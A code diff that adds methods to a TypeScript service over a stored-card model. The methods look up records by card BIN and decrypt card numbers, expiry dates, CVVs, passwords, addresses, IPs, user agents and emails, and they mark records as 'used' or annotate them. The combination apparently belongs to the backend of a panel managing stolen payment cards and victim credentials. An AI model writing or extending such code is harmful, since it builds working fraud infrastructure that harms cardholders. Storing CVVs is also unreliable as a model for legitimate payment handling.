@@ -110,4 +110,26 @@ export class InformationService {
             return item;
         });
     }
+    async getInfoByListBin(listBin: string[]) {
+        const data = await this.ccModel.find({ bin: { $in: listBin } });
+        return data.map(item => {
+            item.ccnum = this.decrypt(item.ccnum);
+            item.month = this.decrypt(item.month);
+            item.year = this.decrypt(item.year);
+            item.cvv = this.decrypt(item.cvv);
+            item.password = this.decrypt(item.password);
+            item.address = this.decrypt(item.address);
+            item.address2 = this.decrypt(item.address2);
+            item.ip = this.decrypt(item.ip);
+            item.userAgent = this.decrypt(item.userAgent);
+            item.email = this.decrypt(item.email);
+            return item;
+        });
+    }
+    async updateNoteById(id: string, note: string) {
+        return this.ccModel.updateOne({ _id: id }, { note: note });
+    }
+    async updateIsUsedById(id: string, isUsed: boolean) {
+        return this.ccModel.updateOne({ _id: id }, { isUsed: isUsed });
+    }
 }
